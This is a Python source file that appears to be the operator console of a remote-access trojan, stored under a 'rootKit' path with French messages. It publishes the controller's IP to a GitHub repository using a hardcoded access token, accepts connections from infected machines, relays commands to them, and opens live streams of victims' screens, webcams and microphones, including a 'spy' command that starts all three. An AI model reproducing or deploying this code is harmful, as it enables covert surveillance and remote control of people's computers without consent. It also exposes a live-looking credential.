import socket, os, threading, requests, re
from vidstream import StreamingServer
from pyaudio import PyAudio, paInt16
from time import sleep
from numpy import array
from math import *
from fct import clear as clearWindow
from colored import fg, bg, attr
from iteration_utilities import duplicates
from github import Github
def getSelfIp(temp=-1):
    return [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][temp]
def connected():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("www.google.com", 80))
        return True
    except Exception as e:
        print(e)
        return False
if getSelfIp() not in("192.168.249.97") and connected():
    # First create a Github instance:
    g = Github("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")
    # Then play with your Github objects:
    # for repo in g.get_user().get_repos():
    #     print(repo.name)
    repo = g.get_repo("N0SAFE/kit-local")
    try:
        contents = repo.get_contents("rootKit/ip")
        repo.delete_file(contents.path, "remove ip", contents.sha)
    except:
        pass
    repo.create_file("rootKit/ip", "create", getSelfIp())
    with open('ip.txt', "w") as file:
        file.write(getSelfIp())
else:
    print("vous n'étes pas connecter")
    exit()

githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
reset, sendAndReceive, mythreads, threadConnected = attr(0), [], [], []

class Microphone(threading.Thread):
    def __init__(self, ip, port):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.close = False
        self.RUN = False
    def run(self):
        self.RUN = True
        BREAK = False
        while True:
            try:
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.s.connect((self.ip, self.port))
                break
            except:
                if self.close:
                    break
                pass
        if not self.close:
            FORMAT, CHANNELS, RATE, CHUNK = paInt16, 1, 44100, 4096
            audio = PyAudio()
            stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, output=True, frames_per_buffer=CHUNK)
            try:
                while True:
                    data = self.s.recv(CHUNK)
                    try:
                        if data.decode() == "error":
                            break
                    except:
                        pass
                    stream.write(data)
            except:
                pass
            self.s.close()
            stream.close()
            audio.terminate()
        self.RUN = False
    def stopServer(self):
        if self.RUN == True:
            self.s.close()
            self.close = True
    def isRunning(self):
        return self.RUN

class myThread(threading.Thread):
    def __init__(self,ip,port, ID, con, name): 
        threading.Thread.__init__(self)
        self.micIsAlive = False
        self.screen = False
        self.camera = False
        self.linked = False
        self.name = name
        self.con = con
        self.ID = ID
        self.ip = ip 
        self.port = port 
        self.Stop = False
        # print (f"[+] Nouveau thread démarré pour {ip}:{str(port)}, {name}")
    def run(self):
        global ip
        loop = 5
        while True:
            if self.Stop:
                break
            if loop == 10:
                try:
                    getAll.getID().index(self.ID)
                except:
                    break
                try:
                    self.con.sendall("9".encode())
                except:
                    # print("error")
                    break
                loop = 0
            sleep(0.5)
            try:
                getAll.getID().index(self.ID)
            except:
                break
            loop+=1
        try:
            ip.pop(ip.index(self.getFullIp()))
        except:
            pass
        try:
            mythreads.pop(mythreads.index(self.currentthread))
        except:
            pass
        exit()
    def currentThread(self, thread):
        self.currentthread = thread
    def send(self, data):
        data.replace("9", "8+1")
        self.con.sendall(data.encode())
        sleep(0.05)
    def stop(self):
        self.Stop = True
    def getCon(self):
        return self.con
    def getId(self):
        return self.ID
    def getPort(self):
        return self.port
    def getIp(self):
        return self.ip
    def getCurrentThread(self):
        return self.currentthread
    def getName(self):
        return self.name
    def getFullIp(self):
        return f"{self.ip}:{self.port}"
    def testIfSameIp(self, IP):
        IP = IP.split(':')
        if len(IP) > 1:
            return str(self.ip) == str(IP[0]) and str(self.port) == str(IP[1])
        return self.ip == IP[0]
    def isLink(self):
        return self.linked
    def link(self):
        self.linked = True
    def unlink(self):
        self.linked = False
    def screenStart(self, port):
        if not self.screen:
            self.screenPort = port
            self.scrn = (StreamingServer(requests.get(f"{githubUrl}ip").text.replace("\n", ""), port))
            t = threading.Thread(target=self.scrn.start_server)
            t.daemon=True
            t.start()
        self.screen = True
    def screenStop(self):
        self.scrn.stop_server()
        self.screen = False
    def getPortScreen(self):
        return self.screenPort
    def screenIsAlive(self):
        return self.screen
    def cameraStart(self, port):
        if not self.camera:
            self.cameraPort = port
            self.cam = (StreamingServer(requests.get(f"{githubUrl}ip").text.replace("\n", ""), port))
            t = threading.Thread(target=self.cam.start_server)
            t.daemon=True
            t.start()
        self.camera = True
    def cameraStop(self):
        self.cam.stop_server()
        self.camera = False
    def getPortCamera(self):
        return self.cameraPort
    def cameraIsAlive(self):
        return self.camera
    def micStart(self, port):
        try:
            self.micIsAlive = self.mic.isRunning()
        except:
            pass
        if not self.micIsAlive:
            self.micPort = port
            self.mic = Microphone(self.ip, port)
            self.mic.daemon = True
            self.mic.start()
    def micLives(self):
        return self.micIsAlive
    def micStop(self):
        self.mic.stopServer()
    def getPortMic(self):
        return self.micPort
    

class getAll():
    def getID(MYTHREADS=mythreads):
        ret = []
        for thread in MYTHREADS:
            ret.append(thread.getId())
        return ret
    def getCon(MYTHREADS=mythreads):
        ret = []
        for thread in MYTHREADS:
            ret.append(thread.getCon())
        return ret
    def getCurrentThreads(MYTHREADS=mythreads):
        ret = []
        for thread in MYTHREADS:
            ret.append(thread.getCurrentThread())
        return ret
    def getName(MYTHREADS=mythreads):
        ret = []
        for thread in MYTHREADS:
            ret.append(thread.getName())
        return ret
    def getAllByName(name, MYTHREADS=mythreads):
        ret = []
        for thread in MYTHREADS:
            if thread.getName() == name:
                ret.append(thread.getName())
                ret.append(thread.getFullIp())
        return ret
class getConnected():
    def getID():
        ret = []
        for thread in threadConnected:
            ret.append(thread.getId())
        return ret
    def getCon():
        ret = []
        for thread in threadConnected:
            ret.append(thread.getCon())
        return ret
    def getCurrentThreads():
        ret = []
        for thread in threadConnected:
            ret.append(thread.getCurrentThread())
        return ret
    def getName():
        ret = []
        for thread in threadConnected:
            ret.append(thread.getName())
        return ret

# Programme du serveur TCP

port, ipHost = 9999, requests.get(f"{githubUrl}ip").text.replace("\n", "")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
s.bind((ipHost, port))

def MainThread():
    global mythreads
    ID=0
    mainThread = threading.currentThread()
    # print(mainThread)
    while getattr(mainThread, "do_run", True):
        try:
            ID+=1
            s.settimeout(1)
            s.listen(1) 
            # print("Serveur: en attente de connexions des clients TCP ...")
            (con, (ip,port)) = s.accept()
            OK = False
            try:
                name = con.recv(2048).decode()
                OK = True
            except:
                pass
            if OK:
                mythread = myThread(ip, port, ID, con, name)
                mythread.currentThread(mythread)
                mythreads.append(mythread)
                mythread.daemon = True
                mythread.start()
        except:
            pass

mainThread = threading.Thread(target=MainThread)
mainThread.daemon = True
mainThread.start()

def send(data, THREAD=None):
    global addvar, run
    thread = getConnected.getCurrentThreads()
    if not THREAD:
        THREAD=thread
    if Send != False:
        for thread in THREAD:
            try:
                if data.split()[0] in ("screen"):
                    if thread.screenIsAlive():
                        thread.send(f"screen {thread.getPortScreen()}")
                elif data.split()[0] in ("camera"):
                    print(thread.cameraIsAlive())
                    if thread.cameraIsAlive():
                        thread.send(f"camera {thread.getPortCamera()}")
                elif data.split()[0] in ("microphone"):
                    if not thread.micLives():
                        thread.send(f"microphone {thread.getPortMic()} {thread.getIp()}")
                else:
                    thread.send(data)
                # print(f'send {data} to {thread.getCon()}')
                if data in ("die", "left"):
                    thread.stop()
            except:
                print("connexion lost")
                run = False
    else:
        addvar += data+"µ"

def threadingSendAndReceive(dataToSend, ip, port, thread):
    rest = True
    try:
        thread.send(dataToSend)
    except Exception as e:
        print(f'connexion lost on {ip}:{port}')
        rest=False
    if rest:
        try:
            thread.getCon().settimeout(4)
            print(thread.getCon().recv(64000))
        except:
            print(f'no return in {ip}:{port}')
        
def runThreadingSendAndReceive(data):
    loop = 0
    # print(SocketCo)
    for thread in getConnected.getCurrentThreads():
        t = threading.Thread(target=threadingSendAndReceive, args=(data, thread.getIp(), thread.getPort(), thread,))
        sendAndReceive.append(t)
        t.daemon = True
        t.start()
        loop+=1
    sleep(5)

def testIfIpTrue(data, total=False):
    if total == False:
        for i in range(len(data.split('.'))):
            if int(data.split('.')[i]) > 255:
                return False
        return True
    if total != False:
        return testIfIpTrue(data) == True and len(data.split('.')) == 4
def stopSpaceError(data):
    return " ".join(re.split(r"\s+", (re.sub(r"^\s+|\s+$", "", data))))
def clear():
    clearWindow()

def restart(timeout=2):
    global mainThread
    # print(mainThread)
    # print(mythreads)
    mainThread.do_run = False
    for connexion in getAll.getCon():
        try:
            connexion.send('left'.encode())
        except:
            pass
    sleep(timeout)
    mainThread = threading.Thread(target=MainThread)
    mainThread.daemon = True
    mainThread.start()
    clear()

def testEmptyLine(nameFile):
    numberLine, file, ligne, numbsup, lignesup = (len((open(nameFile,'r')).readlines())), (open(nameFile, 'r')), 0, 0, []
    for i in range(numberLine):
        readln, ligne = file.readline(), ligne + 1 
        if readln == "\n":
            lignesup.append(ligne)
            numbsup += 1
    lignesup.sort(reverse=True)
    for i in range(numbsup):
        supLine(nameFile, lignesup[i])
    file.close()

def supLine(filename, line_to_delete):
    initial_line = 1
    file_lines = {}
    with open(filename) as f:
        content = f.readlines() 
    for line in content:
        file_lines[initial_line] = line.strip()
        initial_line += 1
    f = open(filename, "w")
    for line_number, line_content in file_lines.items():
        if line_number != line_to_delete:
            f.write('{}\n'.format(line_content))
    f.close()
    
def printFileCmd():
    filename = "cmd.txt"
    testEmptyLine(filename)
    with open(filename) as fp:
       line = fp.readline()
       cnt = 1
       while line:
           print("Line {}: {}".format(cnt, line.strip()))
           line = fp.readline()
           cnt += 1
    fp.close()

def inputcolor(color=255, attribut=None, content="", preset=None):
    numPreset=preset
    preset=[[127,1,">"]]
    if numPreset != None and numPreset > 0:
        numPreset-=1
        ret = inputcolor(color=preset[numPreset][0], attribut=preset[numPreset][1], content=preset[numPreset][2])
        return ret
    else:
        return input(fg(color)+attr(attribut)+content+reset)

def retLineCmd(filename, numberline):
    with open(filename) as fp:
       line, cnt = fp.readline(), 1
       while line:
            if cnt == numberline:
                return("{}".format(line.strip()))
            line = fp.readline()
            cnt += 1
            
def command(commandToExecute):
    commandToExecute = stopSpaceError(commandToExecute)
    commandToExecuteList = commandToExecute.split()
    global ipToConnect, ip, run, reloading, progrun, affiche
    ip, error = [], False
    try:
        if commandToExecuteList[0] in ("connect", "connexion", "connecter", "co"):
            if len(commandToExecuteList) > 1:
                if commandToExecuteList[1] in ('all'):
                    for thread in mythreads:
                        ip.append(f"{thread.getIp()}:{thread.getPort()}")
                        affiche.append(f"{thread.getIp()}:{thread.getPort()}")
                else:
                    commandToExecuteList.pop(0)
                    for IP in commandToExecuteList:
                        listName = getAll.getAllByName(IP)
                        if listName:
                            ip.append(listName[1])
                            affiche.append(listName[0])
                        else:
                            OK = True
                            ipsplit = IP.split(":")
                            if len(ipsplit) > 1:
                                for i in IP.split(":"):
                                    i = "".join(i.split("."))
                                    if not i.isdigit():
                                        OK = False
                                if OK:
                                    ip.append(IP)
                                    affiche.append(IP)
                                else:
                                    error = True
            else:
                print("[ERROR]: no ip requested")
                command(inputcolor(preset=1))
            if error:
                print("ip error")
                run = False    
        elif commandToExecute in ("stop"):
            global progrun
            progrun = False
        elif commandToExecute in ("help", "aide"):
            help("command")
            command(inputcolor(preset=1))
        elif commandToExecute in ('reloadCo'):
            for thread in getAll.getCurrentThreads():
                try:
                    thread.send('left')
                    mythreads.pop(mythreads.index(thread))
                except Exception as e:
                    print(e)
                    pass
        elif commandToExecute in ('stopCo'):
            for thread in getAll.getCurrentThreads():
                try:
                    thread.send('die')
                    mythreads.pop(mythreads.index(thread))
                except Exception as e:
                    print(e)
                    pass
        elif commandToExecute in ("clear", "cleared", "cls", "restart"):
            print('cleared')
            restart()
            command(inputcolor(preset=1))
        elif commandToExecute in ("reload", "reloading"):
            os.system(os.path.basename(__file__))
            run, reloading, progrun=False, True, False
        elif commandToExecute in ("list"):
            for thread in getAll.getCurrentThreads():
                print(f"{thread.getName()}  --->  {thread.getFullIp()}")
        # elif commandToExecute in ("command"):
        #     try:
        #         temp = run
        #     except:
        #         temp = True
        #     run = True
        #     clear()
        #     print(fg(40)+attr(1)+"your in the cmd space"+reset)
        #     registerCmdAcces("help")
        #     while run == True:
        #         registerCmdAcces(inputcolor(preset=1))
        #     run = temp
        #     restart()
        #     command(inputcolor(preset=1))
        else:
            print("Error")
            command(inputcolor(preset=1))
    except Exception as e:
        print(e)
        command(inputcolor(preset=1))

def registerCmdAcces(data):
    global run
    data = stopSpaceError(data)
    dataList = data.split()
    try:
        if dataList[0] in ("register", "enregistre"):
            customcmd = open("cmd.txt", "a")
            temp = "\n"+" ".join(dataList[1:len(dataList)])
            customcmd.write(temp)
            customcmd.close()
            registerCmdAcces(inputcolor(preset=1))
        elif data in ("help"):
            help("cmd")
            registerCmdAcces(inputcolor(preset=1))
        elif data in ("cmdList", "commandlist", "listcmd", "listcommand", "list"):
            try:
                printFileCmd()
            except:
                print("no cmd register")
                print("to register a cmd write register (and enter your cmd here)")
            registerCmdAcces(inputcolor(preset=1))
        elif data in ("clear", "cls"):
            clear()
            registerCmdAcces("help")
            print("your in the cmd space")
        elif data in ("back"):
            run = False
        elif dataList[0] in ("sup", "del"):
            if len(dataList) > 2 and dataList[2].isdigit() == True:
                dataList[2] = int(dataList[2])
                supLine("cmd.txt", dataList[2])
            elif len(dataList) > 1 and dataList[1].isdigit() == True:
                dataList[1] = int(dataList[1])
                supLine("cmd.txt", dataList[1])
            else:
                print("no int write")
        else:
            print("Error")
            registerCmdAcces(inputcolor(preset=1))
    except:
        registerCmdAcces(inputcolor(preset=1))

def sendData(data):
    global run, Send, mythreads
    datalist = data.split()
    numCmd = data.split("µ")
    if len(numCmd) > 1:
        data = "fastcontrol "+data
        datalist = data.split()
    try:
        if data in ("die", "kill"):
            try:
                send("die")
            except:
                pass
            run = False
        elif data in ("list"):
            for thread in getConnected.getCurrentThreads():
                print(f"{thread.getName()}  --->  {thread.getFullIp()}")
        elif data in ("help", "aide"):
            help("sending")
        elif datalist[0] in ("severalcmd"):
            send(data)
        elif datalist[0] in ("wallpaper"):
            send(data)
        elif data in ("command"):
            try:
                temp = run
            except:
                temp = True
            run = True
            clear()
            print(fg(40)+attr(1)+"your in the cmd space"+reset)
            registerCmdAcces("help")
            while run == True:
                registerCmdAcces(inputcolor(preset=1))
            run = temp
            restart()
        elif datalist[0] in ("command") and datalist[1] in ("list") or datalist[0] in ("cmdlist", "listcmd"):
            try:
                printFileCmd()
            except:
                print("no cmd register")
                print("to register a cmd write register (and enter your cmd here)")
        elif datalist[0] in ("command"):
            if len(datalist) > 2 and datalist[2].isdigit() == True:
                datalist[2] = int(datalist[2])
                sendData(retLineCmd("cmd.txt", datalist[2]))
            elif len(datalist) > 1 and datalist[1].isdigit() == True:
                datalist[1] = int(datalist[1])
                sendData(retLineCmd("cmd.txt", datalist[1]))
            else:
                print("no int write")
        elif data in ("left", "quit", "restart", "stop"):
            try:
                send("left")
            except:
                pass
            run = False
        elif data in ("screenStart", "screenstart", "screenRun", "screenrun", "Startscreen", "startscreen", "Runscreen", "runscreen"):
            send("screen")
        elif data in ("screenStop", "screenstop", "Stopscreen", "stopscreen"):
            screenStop(reload=True)
        elif data in ("cameraStart", "camerastart", "cameraRun", "camerarun", "camStart", "camstart", "camRun", "camrun", "Startcamera", "startcamera", "Runcamera", "runcamera", "Startcam", "startcam", "Runcam", "runcam"):
            send("camera")
        elif data in ("cameraStop", "camerastop", "camStop", "camstop", "Stopcamera", "stopcamera", "Stopcam", "stopcam"):
            cameraStop(reload=True)
        elif data in ("startmic"):
            send("microphone")
        elif data in ('micStop'):
            micStop(reload=True)
        elif data in ("spy"):
            sendData("startmic")
            sleep(0.5)
            sendData("cameraStart")
            sleep(0.5)
            sendData("screenStart")
        elif data in ('spyStop'):
            sendData("micStop")
            sleep(0.5)
            sendData("cameraStop")
            sleep(0.5)
            sendData("screenStop")
        elif datalist[0] in ("fasttap", "fastTap", "tapfast", "tapFast"):
            datalist.pop(0)
            print(datalist)
            data = "fast "+" ".join(datalist)
            send(data)
        elif data in ("update"):
            run = False
            send("update")
        elif datalist[0] in ("update"):
            run = False
            if datalist[1] in ("delete", "del", "sup", "clear", "cls", "cleared"):
                send("updelte")
            else:
                send("update")
        elif data in ("cls", "clear"):
            restart()
        elif datalist[0] in ("time", "sleep"):
            if not datalist[1]:
                datalist.append(1)
            sleep(int(datalist[1]))
        elif datalist[0] in ("fastcontrol"):
            Send = False
            datalist.pop(0)
            datalist = " ".join(datalist)
            datalist = datalist.split("µ")
            for i in range(len(datalist)):
                datalist[i] = stopSpaceError(datalist[i])
                sendData(datalist[i])
            Send = True
            send("severalcontrol "+addvar)
            # while data != "ok":
            #     SocketCo.settimeout(3)
            #     data = (SocketCo.recv(ceil(32768))).decode()
            #     print(data)
        else:
            runThreadingSendAndReceive(data)
    except Exception as e:
        print(e)
        pass

def screenStop(MYTHREADS=mythreads, reload=False):
    for thread in MYTHREADS:
        try:
            thread.screenStop()
        except:
            pass
        if reload:
            thread.screenStart(thread.getPortScreen())

def cameraStop(MYTHREADS=mythreads, reload=False):
    for thread in MYTHREADS:
        try:
            thread.cameraStop()
        except:
            pass
        if reload:
            thread.cameraStart(thread.getPortCamera())

def micStop(MYTHREADS=mythreads, reload=False):
    for thread in MYTHREADS:
        try:
            thread.micStop()
        except:
            pass
        if reload:
            thread.micStart(thread.getPortMic())

progrun = True
while progrun:
    ip, Send, run = [], True, False
    affiche = []
    command(inputcolor(preset=1))
    if ip:
        if list(duplicates(ip)):
            print("vous ne pouvez pas ecrire plusieur ip/port semblable ou alors preciser le port avec (ip:port) ou alors par son nom")
            ip = []
        loopScreenCam = 0
        threadConnected = []
        afficheIpPortConnected = []
        for ipToCo in ip:
            loop = 0
            for thread in mythreads:
                if thread.testIfSameIp(ipToCo):
                    try:
                        threadConnected.index(thread)
                        OK = False
                    except:
                        OK = True
                    if OK:
                        portScreenCamMic = 22224+loopScreenCam
                        threadConnected.append(thread)
                        afficheIpPortConnected.append(f"{thread.getIp()}:{thread.getPort()}")
                        thread.screenStart(portScreenCamMic)
                        thread.cameraStart(portScreenCamMic+1)
                        thread.micStart(portScreenCamMic+2)
                        run = True
                        break
                loop += 1
            loopScreenCam += 3
            if threadConnected:
                server = True
    while run == True and progrun == True:
        if ip:
            addvar = ""
            affichage = ", ".join(affiche)
            if list(duplicates(affiche)):
                affichage = ", ".join(afficheIpPortConnected)
            sendData(input(fg(127)+attr(1)+affichage+">"+reset))
        else:
            run = False
            print('tout les socket sont fermer')
    try:
        if server == True:
            screenStop(threadConnected)
            cameraStop(threadConnected)
            micStop(threadConnected)
            server = False
    except:
        pass

mainThread.do_run = False
exit()
